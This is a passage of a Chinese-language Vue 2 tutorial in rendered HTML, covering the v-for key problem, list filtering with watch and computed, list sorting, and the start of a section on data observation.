class="hljs-name">button</span> @<span class="hljs-attr">click.once</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span>添加一个老刘<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(p,index) of persons&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;index&quot;</span>&gt;</span><br>            &#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;<br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript"><span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript"><span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript"><span class="hljs-attr">persons</span>: [</span><br><span class="language-javascript">&#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;001&#x27;</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;张三&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">18</span> &#125;,</span><br><span class="language-javascript">&#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;002&#x27;</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;李四&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">19</span> &#125;,</span><br><span class="language-javascript">&#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;003&#x27;</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;王五&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">20</span> &#125;</span><br><span class="language-javascript">]</span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript"><span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript"><span class="hljs-title function_">add</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript"><span class="hljs-keyword">const</span> p = &#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;004&#x27;</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;老刘&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">40</span> &#125;</span><br><span class="language-javascript"><span class="hljs-variable language_">this</span>.<span class="hljs-property">persons</span>.<span class="hljs-title function_">unshift</span>(p)</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript">&#125;);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>解释：</p></blockquote><p>初始数据</p><p>persons: [  </p><p>{ id: ‘001’, name: ‘张三’, age: 18 },  </p><p>{ id: ‘002’, name: ‘李四’, age: 19 },  </p><p>{ id: ‘003’, name: ‘王五’, age: 20 }  </p><p>]</p><p><strong>vue根据数据生成虚拟 DOM</strong></p><p>初始虚拟 DOM</p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#x27;0&#x27;</span>&gt;</span>张三-18<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#x27;1&#x27;</span>&gt;</span>李四-19<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#x27;2&#x27;</span>&gt;</span>王五-20<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p><strong>将虚拟 DOM 转为 真实 DOM</strong></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124114010268.png" alt="image-20221124114010268"></p><p><code>this.persons.unshift(&#123; id: &#39;004&#39;, name: &#39;老刘&#39;, age: 40 &#125;)</code></p><p>在 persons 数组最前面添加上 { id: ‘004’, name: ‘老刘’, age: 40 }</p><p>新数据：</p><p>persons: [</p><p> { id: ‘004’, name: ‘老刘’, age: 40 },</p><p> { id: ‘001’, name: ‘张三’, age: 18 },  </p><p> { id: ‘002’, name: ‘李四’, age: 19 },  </p><p> { id: ‘003’, name: ‘王五’, age: 20 }  </p><p>]</p><p><strong>vue根据数据生成虚拟 DOM</strong></p><p>新虚拟 DOM</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#x27;0&#x27;</span>&gt;</span>老刘-30<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#x27;1&#x27;</span>&gt;</span>张三-18<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#x27;3&#x27;</span>&gt;</span>李四-19<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#x27;4&#x27;</span>&gt;</span>王五-20<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>将虚拟 DOM 转为 真实 DOM</strong></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124114120362.png" alt="image-20221124114120362"></p><p>因为老刘被插到第一个，重刷了 key 的值，vue Diff 算法 根据 key 的值 判断 虚拟DOM 全部发生了改变，然后全部重新生成新的 真实<br>DOM。实际上，张三，李四，王五并没有发生更改，是可以直接复用之前的真实 DOM，而因为 key 的错乱，导致要全部重新生成，造成了性能的浪费。</p><blockquote><p>来张尚硅谷的图</p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/ec80a7ae139642d09d70e77ca37e0a52.png" alt="在这里插入图片描述"></p><p><strong>如果结构中还包含输入类的DOM ：</strong></p><p>会产生错误DOM更新 &#x3D;&#x3D;&gt; 界面有问题。</p><blockquote><p>这回造成的就不是性能浪费了，会直接导致页面的错误</p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124114210283.png" alt="image-20221124114210283"></p><h3 id="结论："><a href="#结论：" class="headerlink" title="结论："></a>结论：</h3><ul><li>最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值</li><li>如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的</li></ul><blockquote><p>来张尚硅谷的图，正经使用 key</p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/e5b3f8a66d7441e5bcff0a2525266759.png" alt="在这里插入图片描述"></p><h3 id="列表过滤"><a href="#列表过滤" class="headerlink" title="列表过滤"></a>列表过滤</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>列表过滤<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>人员列表<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;请输入名字&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;keyWord&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(p,index) of filPersons&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;p.id&quot;</span>&gt;</span><br>      &#123;&#123; p.name &#125;&#125;-&#123;&#123; p.age &#125;&#125;-&#123;&#123; p.sex &#125;&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript">  <span class="hljs-comment">// 用 watch 实现</span></span><br><span class="language-javascript">  <span class="hljs-comment">// #region </span></span><br><span class="language-javascript">  <span class="hljs-comment">/* new Vue(&#123;</span></span><br><span class="hljs-comment"><span class="language-javascript">el: &#x27;#root&#x27;,</span></span><br><span class="hljs-comment"><span class="language-javascript">data: &#123;</span></span><br><span class="hljs-comment"><span class="language-javascript">keyWord: &#x27;&#x27;,</span></span><br><span class="hljs-comment"><span class="language-javascript">persons: [</span></span><br><span class="hljs-comment"><span class="language-javascript">&#123; id: &#x27;001&#x27;, name: &#x27;马冬梅&#x27;, age: 19, sex: &#x27;女&#x27; &#125;,</span></span><br><span class="hljs-comment"><span class="language-javascript">&#123; id: &#x27;002&#x27;, name: &#x27;周冬雨&#x27;, age: 20, sex: &#x27;女&#x27; &#125;,</span></span><br><span class="hljs-comment"><span class="language-javascript">&#123; id: &#x27;003&#x27;, name: &#x27;周杰伦&#x27;, age: 21, sex: &#x27;男&#x27; &#125;,</span></span><br><span class="hljs-comment"><span class="language-javascript">&#123; id: &#x27;004&#x27;, name: &#x27;温兆伦&#x27;, age: 22, sex: &#x27;男&#x27; &#125;</span></span><br><span class="hljs-comment"><span class="language-javascript">],</span></span><br><span class="hljs-comment"><span class="language-javascript">filPersons: []</span></span><br><span class="hljs-comment"><span class="language-javascript">&#125;,</span></span><br><span class="hljs-comment"><span class="language-javascript">watch: &#123;</span></span><br><span class="hljs-comment"><span class="language-javascript">keyWord: &#123;</span></span><br><span class="hljs-comment"><span class="language-javascript">immediate: true,</span></span><br><span class="hljs-comment"><span class="language-javascript">handler(val) &#123;</span></span><br><span class="hljs-comment"><span class="language-javascript">this.filPersons = this.persons.filter((p) =&gt; &#123;</span></span><br><span class="hljs-comment"><span class="language-javascript">return p.name.indexOf(val) !== -1</span></span><br><span class="hljs-comment"><span class="language-javascript">&#125;)</span></span><br><span class="hljs-comment"><span class="language-javascript">&#125;</span></span><br><span class="hljs-comment"><span class="language-javascript">&#125;</span></span><br><span class="hljs-comment"><span class="language-javascript">&#125;</span></span><br><span class="hljs-comment"><span class="language-javascript">&#125;) */</span></span><br><span class="language-javascript">  <span class="hljs-comment">//#endregion</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-comment">// 用 computed 实现</span></span><br><span class="language-javascript">  <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">    <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-attr">keyWord</span>: <span class="hljs-string">&#x27;&#x27;</span>,</span><br><span class="language-javascript">      <span class="hljs-attr">persons</span>: [</span><br><span class="language-javascript">        &#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;001&#x27;</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;马冬梅&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">19</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">&#x27;女&#x27;</span> &#125;,</span><br><span class="language-javascript">        &#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;002&#x27;</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;周冬雨&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">20</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">&#x27;女&#x27;</span> &#125;,</span><br><span class="language-javascript">        &#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;003&#x27;</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;周杰伦&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">21</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">&#x27;男&#x27;</span> &#125;,</span><br><span class="language-javascript">        &#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;004&#x27;</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;温兆伦&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">22</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">&#x27;男&#x27;</span> &#125;</span><br><span class="language-javascript">      ]</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-attr">computed</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-title function_">filPersons</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">persons</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">p</span>) =&gt;</span> &#123;</span><br><span class="language-javascript">          <span class="hljs-keyword">return</span> p.<span class="hljs-property">name</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">keyWord</span>) !== -<span class="hljs-number">1</span></span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  &#125;) </span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221112213931286.png" alt="image-20221112213931286"></p><h3 id="列表排序"><a href="#列表排序" class="headerlink" title="列表排序"></a>列表排序</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>列表排序<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>人员列表<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;请输入名字&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;keyWord&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;sortType = 2&quot;</span>&gt;</span>年龄升序<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;sortType = 1&quot;</span>&gt;</span>年龄降序<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;sortType = 0&quot;</span>&gt;</span>原顺序<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(p,index) of filPersons&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;p.id&quot;</span>&gt;</span><br>      &#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;-&#123;&#123;p.sex&#125;&#125;<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript">  <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">    <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-attr">keyWord</span>: <span class="hljs-string">&#x27;&#x27;</span>,</span><br><span class="language-javascript">      <span class="hljs-attr">sortType</span>: <span class="hljs-number">0</span>, <span class="hljs-comment">// 0原顺序 1降序 2升序</span></span><br><span class="language-javascript">      <span class="hljs-attr">persons</span>: [</span><br><span class="language-javascript">        &#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;001&#x27;</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;马冬梅&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">30</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">&#x27;女&#x27;</span> &#125;,</span><br><span class="language-javascript">        &#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;002&#x27;</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;周冬雨&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">31</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">&#x27;女&#x27;</span> &#125;,</span><br><span class="language-javascript">        &#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;003&#x27;</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;周杰伦&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">18</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">&#x27;男&#x27;</span> &#125;,</span><br><span class="language-javascript">        &#123; <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;004&#x27;</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;温兆伦&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">19</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">&#x27;男&#x27;</span> &#125;</span><br><span class="language-javascript">      ]</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-attr">computed</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-title function_">filPersons</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> arr = <span class="hljs-variable language_">this</span>.<span class="hljs-property">persons</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">p</span>) =&gt;</span> &#123;</span><br><span class="language-javascript">          <span class="hljs-keyword">return</span> p.<span class="hljs-property">name</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">keyWord</span>) !== -<span class="hljs-number">1</span></span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">        <span class="hljs-comment">//判断一下是否需要排序</span></span><br><span class="language-javascript">        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">sortType</span>) &#123;</span><br><span class="language-javascript">          arr.<span class="hljs-title function_">sort</span>(<span class="hljs-function">(<span class="hljs-params">p1, p2</span>) =&gt;</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">sortType</span> === <span class="hljs-number">1</span> ? p2.<span class="hljs-property">age</span> - p1.<span class="hljs-property">age</span> : p1.<span class="hljs-property">age</span> - p2.<span class="hljs-property">age</span></span><br><span class="language-javascript">          &#125;)</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">        <span class="hljs-keyword">return</span> arr</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1379492/1643211061137-37aec6e3-9594-434d-b2d9-d31f752992e1.png" alt="image.png"></p><h2 id="1-14-vue-监测data-中的-数据"><a href="#1-14-vue-监测data-中的-数据" class="headerlink" title="1.14 vue 监测data 中的 数据"></a>1.14 vue 监测data 中的 数据</h2><p>先来个案例引入一下：</p>   <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 准备好一个容器--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>人员列表<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;updateMei&quot;</span>&gt;</span>更新马冬梅的信息<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(p,index) of persons&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;p.id&quot;</span>&gt;</span><br>            &#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;-&#123;&#123;p.sex&#125;&#125;<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">        <span 